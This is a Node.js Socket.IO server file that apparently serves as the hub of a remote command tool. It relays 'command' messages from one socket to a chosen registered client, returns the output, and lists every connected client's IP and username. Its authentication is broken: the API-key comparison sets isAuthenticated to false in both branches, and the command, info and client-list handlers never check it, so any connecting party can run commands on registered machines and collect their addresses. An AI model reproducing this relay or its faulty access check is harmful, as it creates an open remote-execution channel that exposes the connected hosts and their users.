const express = require('express');
const http = require('http');
const { connect } = require('http2');
const socketIO = require('socket.io');

require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIO(server);

const port = 3000;

const API_KEY = process.env.API_KEY
let connectedClients = {}
// Serve static files from the "public" folder
app.use(express.static('public'));

// Socket.IO event handling
io.on('connection', (socket) => {

  socket.on('establishment', (data) => {
    console.log(data)
    try {
      if (!data.client) {
        socket.data.isClient = false;
        if (data.apiKey === API_KEY) {
          socket.data.isAuthenticated = false;
        } else {
          socket.data.isAuthenticated = false;
        }
      } else {
        socket.data.isClient = true;
        const clientInfo = {
          ip: data.ip, // Assuming you have 'ip' in the data object
          username: data.username, // Assuming you have 'username' in the data object
        };
        connectedClients[socket.id] = clientInfo;
      }
      socket.emit('establishmentResponse', 200)
    } catch (error) {
      console.log(error)
      socket.emit('establishmentResponse', 500)
    }

    console.log(socket.id, "established");
  });

  socket.on('sendCommand', (data) => {
    let sendingData = {'command': data.command, 'returnAddress': socket.id}
    io.to(data.target).emit('command', sendingData);
  });

  socket.on('commandResponse', (data) => {
    let sendingData = {'output': data.output};
    io.to(data.returnAddress).emit('sendCommandResponse', sendingData);
  });

  socket.on('getInfo', (data) => {
    socket.emit('getInfoResponse', connectedClients[data.target]); //bracket notation to prevent confusion
  })

  // Handle 'disconnect' event
  socket.on('disconnect', () => {
    console.log('A user disconnected');
    delete connectedClients[socket.id]
  });

  socket.on('getConnectedClients', (data) => {
    let sendData = {'connectedClients': connectedClients, 'isShell': data.isShell}
    socket.emit('getConnectedClientsResponse', sendData);
  });
});

// Start the server
server.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
